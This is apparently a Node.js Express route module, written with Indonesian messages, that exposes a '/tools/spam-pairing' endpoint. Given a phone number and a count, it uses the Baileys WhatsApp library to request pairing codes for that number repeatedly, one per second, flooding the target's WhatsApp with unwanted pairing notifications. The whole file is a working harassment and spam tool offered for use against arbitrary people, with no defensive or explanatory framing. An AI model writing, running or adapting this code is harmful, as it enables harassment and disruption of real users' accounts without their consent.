const {
    makeWASocket,
    useMultiFileAuthState,
    makeCacheableSignalKeyStore,
} = require("baileys");
const Pino = require("pino");
const chalk = require("chalk");

let sessionCache = {}; // Cache untuk menyimpan sesi di memory

function no(number) {
    return number.replace(/\D/g, "").replace(/^0/, "62");
}

module.exports = (app) => {
    app.get("/tools/spam-pairing", async (req, res) => {
        let { number, count } = req.query;

        if (!number) {
            return res.status(400).json({ error: "❌ Harap masukkan nomor yang valid!" });
        }

        let target = no(number);
        let jumlah = parseInt(count) || 20;

        // Cek apakah sesi sudah ada di cache
        if (!sessionCache[target]) {
            console.log("> 🔍 Sesi tidak ditemukan, membuat sesi baru...");

            const { state } = await useMultiFileAuthState();
            sessionCache[target] = state; // Simpan sesi di memory
        } else {
            console.log("> 🔄 Menggunakan sesi yang sudah ada di memory...");
        }

        const config = {
            logger: Pino({ level: "fatal" }).child({ level: "fatal" }),
            printQRInTerminal: false,
            mobile: false,
            auth: {
                creds: sessionCache[target].creds,
                keys: makeCacheableSignalKeyStore(sessionCache[target].keys, Pino({ level: "fatal" }).child({ level: "fatal" })),
            },
            version: [2, 3e3, 1015901307],
            browser: ["Ubuntu", "Edge", "110.0.1587.56"],
            markOnlineOnConnect: true,
        };

        let sock = makeWASocket(config);

        console.log("> ✅ Koneksi berhasil!");

        setTimeout(async () => {
            for (let i = 0; i < jumlah; i++) {
                try {
                    let retries = i + 1;
                    let pairing = await sock.requestPairingCode(target);
                    let code = pairing?.match(/.{1,4}/g)?.join("-") || pairing;

                    console.log(
                        `> ${chalk.yellow.bold("[" + retries + "/" + jumlah + "]")} ` +
                        `😛 Kode pairing anda: ${code}`
                    );
                } catch (err) {
                    console.log(`> ❌ Gagal mendapatkan pairing code: ${err.message}`);
                }
                await new Promise(resolve => setTimeout(resolve, 1000));
            }
        }, 3000);

        return res.json({ status: true, result: { message: "✅ Proses pairing dimulai!", target, jumlah } });
    });
};